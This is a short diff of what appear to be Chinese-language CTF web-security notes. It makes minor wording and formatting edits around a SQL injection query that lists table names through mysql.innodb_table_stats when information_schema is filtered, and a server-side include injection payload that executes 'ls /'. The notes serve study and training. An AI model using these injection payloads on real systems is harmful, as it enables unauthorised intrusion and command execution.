@@ -634,7 +634,7 @@ information_schema 被过滤了, 因为含有 or
 
 需要配置 `default-storage-engine=InnoDB`
 
-不过默认条件下的存储引擎是 MyISAM, 大多数情况下无法利用
+不过默认的存储引擎是 MyISAM, 大多数情况下无法利用
 
 ```sql
 select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();
@@ -1212,7 +1212,7 @@ SSI 注入
 
 试一下执行命令的 payload
 
-```
+```html
 <!--#exec cmd="ls /"-->
 ```
 
